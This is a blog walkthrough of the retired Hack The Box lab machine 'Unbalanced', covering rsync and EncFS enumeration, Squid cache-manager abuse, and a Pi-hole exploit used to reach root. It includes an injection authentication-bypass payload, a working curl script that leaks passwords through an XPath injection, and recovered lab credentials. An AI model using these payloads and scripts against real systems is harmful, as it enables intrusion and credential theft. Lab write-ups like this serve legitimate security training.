---
layout: post  
title: "Unbalanced: Hack The Box Walkthrough"
date: 2020-12-07 01:17:31 +0000
last_modified_at: 2020-12-07 01:17:31 +0000
category: Walkthrough
tags: ["Hack The Box", Unbalanced, retired, Linux, Hard]
comments: true
protect: false
image:
  feature: unbalanced-htb-walkthrough.png
---

This post documents the complete walkthrough of Unbalanced, a retired vulnerable [VM][1] created by [polarbearer][2] and [GibParadox][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Unbalanced is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.200 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-08-02 13:03:01 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.200
Discovered open port 3128/tcp on 10.10.10.200
Discovered open port 873/tcp on 10.10.10.200
```

Interesting list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,873,3128 -A --reason 10.10.10.200 -oN nmap.txt
...
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      syn-ack ttl 63 (protocol version 31)
3128/tcp open  http-proxy syn-ack ttl 63 Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
```

Wow. There's `rsyncd` and `squid`. Let's see what we get from `rsync`.

```
# rsync rsync://10.10.10.200/
conf_backups    EncFS-encrypted configuration backups
```

Looks like it has something to do with EncFS.

### Mounting EncFS

Let's browse `conf_backups` shall we?

{% include image.html image_alt="f5dfdec6.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/f5dfdec6.png" %}

Indeed. Those files with gibberish names? They are encrypted files. Let's `rsync` a copy of `conf_backups` to my machine.

```
# rsync rsync://10.10.10.200/conf_backups/* ./conf_backups
```

The file `encfs6.xml` contains the key to decrypt those files but we need the password to unlock the key. Enter John the Ripper.

<div class="filename"><span>encfs6.xml</span></div>

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE boost_serialization>
<boost_serialization signature="serialization::archive" version="7">
    <cfg class_id="0" tracking_level="0" version="20">
        <version>20100713</version>
        <creator>EncFS 1.9.5</creator>
        <cipherAlg class_id="1" tracking_level="0" version="0">
            <name>ssl/aes</name>
            <major>3</major>
            <minor>0</minor>
        </cipherAlg>
        <nameAlg>
            <name>nameio/block</name>
            <major>4</major>
            <minor>0</minor>
        </nameAlg>
        <keySize>192</keySize>
        <blockSize>1024</blockSize>
        <plainData>0</plainData>
        <uniqueIV>1</uniqueIV>
        <chainedNameIV>1</chainedNameIV>
        <externalIVChaining>0</externalIVChaining>
        <blockMACBytes>0</blockMACBytes>
        <blockMACRandBytes>0</blockMACRandBytes>
        <allowHoles>1</allowHoles>
        <encodedKeySize>44</encodedKeySize>
        <encodedKeyData>
GypYDeps2hrt2W0LcvQ94TKyOfUcIkhSAw3+iJLaLK0yntwAaBWj6EuIet0=
</encodedKeyData>
        <saltLen>20</saltLen>
        <saltData>
mRdqbk2WwLMrrZ1P6z2OQlFl8QU=
</saltData>
        <kdfIterations>580280</kdfIterations>
        <desiredKDFDuration>500</desiredKDFDuration>
    </cfg>
</boost_serialization>
```

{% include image.html image_alt="b591c495.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/b591c495.png" %}

Armed with the password `bubblegum`, we can mount EncFS like so.

```
# encfs /root/Downloads/machines/unbalanced/conf_backups/ /root/Downloads/machines/unbalanced/decrypted/
```

Where `decrypted` is the mount point.

```
drwxr-xr-x 2 root root   4096 Aug  2 17:24 .
drwxr-xr-x 4 root root   4096 Aug  2 17:27 ..
-rw-r--r-- 1 root root    267 Aug  2 17:24 50-localauthority.conf
-rw-r--r-- 1 root root    455 Aug  2 17:24 50-nullbackend.conf
-rw-r--r-- 1 root root     48 Aug  2 17:24 51-debian-sudo.conf
-rw-r--r-- 1 root root    182 Aug  2 17:24 70debconf
-rw-r--r-- 1 root root   2351 Aug  2 17:24 99-sysctl.conf
-rw-r--r-- 1 root root   4564 Aug  2 17:24 access.conf
-rw-r--r-- 1 root root   2981 Aug  2 17:24 adduser.conf
-rw-r--r-- 1 root root   1456 Aug  2 17:24 bluetooth.conf
-rw-r--r-- 1 root root   5713 Aug  2 17:24 ca-certificates.conf
-rw-r--r-- 1 root root    662 Aug  2 17:24 com.ubuntu.SoftwareProperties.conf
-rw-r--r-- 1 root root    246 Aug  2 17:24 dconf
-rw-r--r-- 1 root root   2969 Aug  2 17:24 debconf.conf
-rw-r--r-- 1 root root    230 Aug  2 17:24 debian.conf
-rw-r--r-- 1 root root    604 Aug  2 17:24 deluser.conf
-rw-r--r-- 1 root root   1735 Aug  2 17:24 dhclient.conf
-rw-r--r-- 1 root root    346 Aug  2 17:24 discover-modprobe.conf
-rw-r--r-- 1 root root    127 Aug  2 17:24 dkms.conf
-rw-r--r-- 1 root root     21 Aug  2 17:24 dns.conf
-rw-r--r-- 1 root root    652 Aug  2 17:24 dnsmasq.conf
-rw-r--r-- 1 root root   1875 Aug  2 17:24 docker.conf
-rw-r--r-- 1 root root     38 Aug  2 17:24 fakeroot-x86_64-linux-gnu.conf
-rw-r--r-- 1 root root    906 Aug  2 17:24 framework.conf
-rw-r--r-- 1 root root    280 Aug  2 17:24 fuse.conf
-rw-r--r-- 1 root root   2584 Aug  2 17:24 gai.conf
-rw-r--r-- 1 root root   3635 Aug  2 17:24 group.conf
-rw-r--r-- 1 root root   5060 Aug  2 17:24 hdparm.conf
-rw-r--r-- 1 root root      9 Aug  2 17:24 host.conf
-rw-r--r-- 1 root root   1269 Aug  2 17:24 initramfs.conf
-rw-r--r-- 1 root root    927 Aug  2 17:24 input.conf
-rw-r--r-- 1 root root   1042 Aug  2 17:24 journald.conf
-rw-r--r-- 1 root root    144 Aug  2 17:24 kernel-img.conf
-rw-r--r-- 1 root root    332 Aug  2 17:24 ldap.conf
-rw-r--r-- 1 root root     34 Aug  2 17:24 ld.so.conf
-rw-r--r-- 1 root root    191 Aug  2 17:24 libaudit.conf
-rw-r--r-- 1 root root     44 Aug  2 17:24 libc.conf
-rw-r--r-- 1 root root   2161 Aug  2 17:24 limits.conf
-rw-r--r-- 1 root root    150 Aug  2 17:24 listchanges.conf
-rw-r--r-- 1 root root   1042 Aug  2 17:24 logind.conf
-rw-r--r-- 1 root root    435 Aug  2 17:24 logrotate.conf
-rw-r--r-- 1 root root   4491 Aug  2 17:24 main.conf
-rw-r--r-- 1 root root    812 Aug  2 17:24 mke2fs.conf
-rw-r--r-- 1 root root    195 Aug  2 17:24 modules.conf
-rw-r--r-- 1 root root   1440 Aug  2 17:24 namespace.conf
-rw-r--r-- 1 root root    120 Aug  2 17:24 network.conf
-rw-r--r-- 1 root root    529 Aug  2 17:24 networkd.conf
-rw-r--r-- 1 root root    510 Aug  2 17:24 nsswitch.conf
-rw-r--r-- 1 root root   1331 Aug  2 17:24 org.freedesktop.PackageKit.conf
-rw-r--r-- 1 root root    706 Aug  2 17:24 PackageKit.conf
-rw-r--r-- 1 root root    552 Aug  2 17:24 pam.conf
-rw-r--r-- 1 root root   2972 Aug  2 17:24 pam_env.conf
-rw-r--r-- 1 root root   1583 Aug  2 17:24 parser.conf
-rw-r--r-- 1 root root    324 Aug  2 17:24 protect-links.conf
-rw-r--r-- 1 root root   3267 Aug  2 17:24 reportbug.conf
-rw-r--r-- 1 root root     87 Aug  2 17:24 resolv.conf
-rw-r--r-- 1 root root    649 Aug  2 17:24 resolved.conf
-rw-r--r-- 1 root root    146 Aug  2 17:24 rsyncd.conf
-rw-r--r-- 1 root root   1988 Aug  2 17:24 rsyslog.conf
-rw-r--r-- 1 root root   2041 Aug  2 17:24 semanage.conf
-rw-r--r-- 1 root root    419 Aug  2 17:24 sepermit.conf
-rw-r--r-- 1 root root    790 Aug  2 17:24 sleep.conf
-rw-r--r-- 1 root root 316553 Aug  2 17:24 squid.conf
-rw-r--r-- 1 root root   2351 Aug  2 17:24 sysctl.conf
-rw-r--r-- 1 root root   1628 Aug  2 17:24 system.conf
-rw-r--r-- 1 root root   2179 Aug  2 17:24 time.conf
-rw-r--r-- 1 root root    677 Aug  2 17:24 timesyncd.conf
-rw-r--r-- 1 root root   1260 Aug  2 17:24 ucf.conf
-rw-r--r-- 1 root root    281 Aug  2 17:24 udev.conf
-rw-r--r-- 1 root root    378 Aug  2 17:24 update-initramfs.conf
-rw-r--r-- 1 root root   1130 Aug  2 17:24 user.conf
-rw-r--r-- 1 root root    414 Aug  2 17:24 user-dirs.conf
-rw-r--r-- 1 root root   1889 Aug  2 17:24 Vendor.conf
-rw-r--r-- 1 root root   1513 Aug  2 17:24 wpa_supplicant.conf
-rw-r--r-- 1 root root    100 Aug  2 17:24 x86_64-linux-gnu.conf
-rw-r--r-- 1 root root    642 Aug  2 17:24 xattr.conf
```

`squid.conf` caught my eye immediately because of its large size compared to others.

### Squid Cache Manager

Check out the active configurations.

<div class="filename"><span>squid.conf</span></div>

```
# grep -Ev '^#' squid.conf | sed -r '/^$/d'
acl localnet src 0.0.0.1-0.255.255.255  # RFC 1122 "this" network (LAN)
acl localnet src 10.0.0.0/8             # RFC 1918 local private network (LAN)
acl localnet src 100.64.0.0/10          # RFC 6598 shared address space (CGN)
acl localnet src 169.254.0.0/16         # RFC 3927 link-local (directly plugged) machines
acl localnet src 172.16.0.0/12          # RFC 1918 local private network (LAN)
acl localnet src 192.168.0.0/16         # RFC 1918 local private network (LAN)
acl localnet src fc00::/7               # RFC 4193 local private network range
acl localnet src fe80::/10              # RFC 4291 link-local (directly plugged) machines
acl SSL_ports port 443
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp
acl Safe_ports port 443         # https
acl Safe_ports port 70          # gopher
acl Safe_ports port 210         # wais
acl Safe_ports port 1025-65535  # unregistered ports
acl Safe_ports port 280         # http-mgmt
acl Safe_ports port 488         # gss-http
acl Safe_ports port 591         # filemaker
acl Safe_ports port 777         # multiling http
acl CONNECT method CONNECT
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow manager
include /etc/squid/conf.d/*
http_access allow localhost
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all
cache disable
```

You can see that the cache manager is accessible by all from this line.

```
http_access allow manager
```

And that certain reports are protected by password `Thah$Sh1`. We can access the reports with `squidclient` because it understands the `cache_object://` URL scheme.

{% include image.html image_alt="caf3dad3.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/caf3dad3.png" %}

#### FQDN Cache Stats and Contents

Let's check out the `fqdncache` report.

{% include image.html image_alt="61ac247c.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/61ac247c.png" %}

You can see that several mappings of IP address to host name.

### Proxying to `intranet.unbalanced.htb`

I already have my browser's proxy set to `10.10.10.200:3128`. Visiting `http://intranet.unbalanced.htb` gives me this.

{% include image.html image_alt="2a0c6ae3.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/2a0c6ae3.png" %}

### Unbalanced load balancing?

{% include image.html image_alt="1b947d16.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/1b947d16.png" %}

You can see that sometimes we get a hit from `172.31.179.2` and sometimes a hit from `172.31.179.3`. What about `172.31.179.1`?

{% include image.html image_alt="5cbe237c.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/5cbe237c.png" %}

Interesting. We know that "**security maintenance**" is usually an euphemism for "**we got hacked**". :laughing:

### SQLi Authentication Bypass

Using `sqli.auth.bypass.txt` from SecLists, I was able to utilize Burp's Intruder to determine the exact payload to reveal a list of users. The payload is `admin'or 1=1 or ''='`.

{% include image.html image_alt="0999e412.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/0999e412.png" %}

A list of users exposed!

{% include image.html image_alt="64dbdae0.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/64dbdae0.png" %}

Something tells me this is XPath Injection rather than SQLi. :thinking:

### Brute-forcing Passwords

If I had to guess, I would say that I can brute-force the password of each user by utilizing a XPath Injection payload to leak the password one character at a time. Suffice to say, I've tested this hypothesis.

{% include image.html image_alt="e30c6c46.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/e30c6c46.png" %}

A user matches and the information appears.

{% include image.html image_alt="596b3150.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/596b3150.png" %}

Armed with this insight, I wrote the following shell script driven by `curl`.

<div class="filename"><span>brute.sh</span></div>

```bash
#!/bin/bash

HOST=172.31.179.1
PROXY=10.10.10.200:3128
USER=$1
PASS=""

PAYLOAD="'or substring(Password,POS,1)='BRUTE"

for pos in $(seq 1 30); do
    for d in $(seq 33 126); do
        char=$(printf \\$(printf "%o" "$d"))
        payload="${PAYLOAD/POS/$pos}"
        payload="${payload/BRUTE/$char}"
        result="$(curl -s \
                       -x $PROXY \
                       -d "Username=${USER}&Password=${payload}" \
                      http://$HOST/intranet.php)"
        if grep $USER <<<"$result" &>/dev/null; then
            PASS=${PASS}$char
            echo $PASS
            break
        fi
    done
done

echo "[+] User is $USER, Password is $PASS"
```

Let's give it a shot.

{% include image.html image_alt="defac9af.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/defac9af.png" %}

It's not pretty I know but hey, it gets the job done. The `&`'s are extraneous, so the passwords should look like this:

```
password01!
stairwaytoheaven
ireallyl0vebubblegum!!!
sarah4evah
```

## Foothold

Now that we have a list of users and passwords, let's feed them into `hydra` and see what gives against SSH.

{% include image.html image_alt="436a4762.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/436a4762.png" %}

Sweet. And there you have it, the file `user.txt` is in `bryan`'s home directory.

{% include image.html image_alt="14942c9a.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/14942c9a.png" %}

## Privilege Escalation

During enumeration of `bryan`'s account, I notice a `TODO` in `bryan`'s home directory.

{% include image.html image_alt="273c735b.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/273c735b.png" %}

It mentioned the presence of a Pi-hole docker. Wait a tick, I know of three dockers but there's another one? Here are all the network interfaces and their IP addresses on `unbalanced`.

{% include image.html image_alt="c394071d.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/c394071d.png" %}

Here's how to do a fast ping sweep with `bash`-fu.

{% include image.html image_alt="676f623f.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/676f623f.png" %}

`/tmp/ip.txt` contains the 65535 IP addresses from `172.31.0.0` to `172.31.255.255`.

### Looking for the Pi-hole

`172.31.11.3` must be the Pi-hole docker. Let's do a local port-forwarding via SSH.

```
# ssh -L 80:172.31.11.3:80 bryan@10.10.10.200 -f -N
```

{% include image.html image_alt="6ba30a59.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/6ba30a59.png" %}

#### Pi-Hole - heisenbergCompensator Blocklist OS Command Execution

Recall the `TODO` in `bryan`'s home directory about setting temporary admin password in Pi-hole? Turns out the password is `admin`. :laughing:

{% include image.html image_alt="599a5fde.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/599a5fde.png" %}

Armed with that, we can use `metasploit` to run exploit `unix/http/pihole_blocklist_exec` for a quick win.

{% include image.html image_alt="7870f610.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/7870f610.png" %}

And we have shell!

{% include image.html image_alt="e2d00cba.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/e2d00cba.png" %}

During enumeration of `root`'s account in `pihole`, I notice the Pi-hole configuration script where the real web admin interface password is set.

{% include image.html image_alt="246ff5f4.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/246ff5f4.png" %}

Could `bUbBl3gUm$43v3Ry0n3!` be the `root`'s password in `unbalanced`? There's only one way to find out.

{% include image.html image_alt="c8fb9af5.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/c8fb9af5.png" %}

Getting `root.txt` is trivial with a `root` shell.

{% include image.html image_alt="f9f90441.png" image_src="/976fd789-f054-4cd7-9869-63c240841a40/f9f90441.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/268
[2]: https://www.hackthebox.eu/home/users/profile/159204
[3]: https://www.hackthebox.eu/home/users/profile/125033
[4]: https://www.hackthebox.eu/
